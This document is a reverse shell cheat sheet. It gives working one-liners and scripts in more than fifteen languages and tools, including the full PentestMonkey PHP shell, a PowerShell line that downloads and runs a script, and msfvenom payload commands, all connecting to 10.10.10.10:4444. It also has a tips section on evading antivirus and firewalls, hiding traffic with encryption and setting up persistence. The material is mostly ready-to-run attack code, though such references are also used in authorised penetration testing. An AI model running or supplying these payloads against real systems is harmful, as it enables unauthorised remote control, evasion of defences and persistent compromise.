# Reverse Shell Cheat Sheet

## Setup Listener

```bash
# Netcat
nc -nlvp 4444

# Socat
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Metasploit Multi/Handler
use multi/handler
set PAYLOAD <matching_payload>
set LHOST <your_ip>
set LPORT 4444
exploit
```

---

## Bash

```bash
# TCP
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# UDP
bash -i >& /dev/udp/10.10.10.10/4444 0>&1

# Alternative
0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196

# /bin/sh if bash not available
/bin/sh -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

---

## Netcat

```bash
# Traditional nc
nc -e /bin/bash 10.10.10.10 4444
nc -e /bin/sh 10.10.10.10 4444

# nc without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# ncat (nmap's netcat)
ncat 10.10.10.10 4444 -e /bin/bash
ncat --udp 10.10.10.10 4444 -e /bin/bash

# OpenBSD nc (Mac OSX)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

---

## Python

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## PHP

```php
<?php
# Method 1
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'");
?>

<?php
# Method 2
$sock=fsockopen("10.10.10.10",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
# Method 3 - PentestMonkey PHP Reverse Shell
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.");
}

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>

# Command line
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Perl

```perl
# Method 1
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Method 2
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# Windows
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Windows
ruby -rsocket -e 'c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Socat

```bash
# Victim
socat TCP:10.10.10.10:4444 EXEC:/bin/bash

# Attacker
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Encrypted shell (requires same certificate on both sides)
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Attacker
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# Victim
socat OPENSSL:10.10.10.10:4444,verify=0 EXEC:/bin/bash
```

---

## PowerShell

```powershell
# Method 1
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Method 2 - Nishang Invoke-PowerShellTcp
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444"

# Method 3 - One-liner base64 encoded
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## Telnet

```bash
# If netcat not available
rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 4444 0</tmp/p | /bin/bash 1>/tmp/p
```

---

## Groovy (Jenkins)

```groovy
String host="10.10.10.10";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Linux only
lua5.1 -e 'local host, port = "10.10.10.10", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

---

## Node.js

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();

# Or
require('child_process').exec('nc -e /bin/sh 10.10.10.10 4444')

# Or
-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.10.10.10 4444 -e /bin/bash')
```

---

## Golang

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---

## OpenSSL

```bash
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Victim
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:4444 > /tmp/s; rm /tmp/s
```

---

## msfvenom Payloads

```bash
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl
```

---

## TTY Shell Upgrade

```bash
# Python
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Then
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash

# Or one-liner
python3 -c 'import pty;pty.spawn("/bin/bash")' && Ctrl+Z && stty raw -echo; fg && export TERM=xterm && export SHELL=bash

# script command
/usr/bin/script -qc /bin/bash /dev/null

# Perl
perl -e 'exec "/bin/bash";'

# Socat
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

---

## Tips

1. Always URL encode if needed for web injection
2. Use different ports if 4444 is blocked
3. Try UDP if TCP is filtered
4. Base64 encode payloads for evasion
5. Use PowerShell encodedCommand for Windows
6. Try different shells (/bin/bash, /bin/sh, /bin/zsh)
7. Check for firewall/AV before executing
8. Use encrypted shells (SSL/TLS) for stealth
9. Stabilize shell immediately after connection
10. Set up persistence quickly

---

## Resources

- PentestMonkey Reverse Shell Cheat Sheet
- PayloadsAllTheThings
- Reverse Shell Generator (revshells.com)
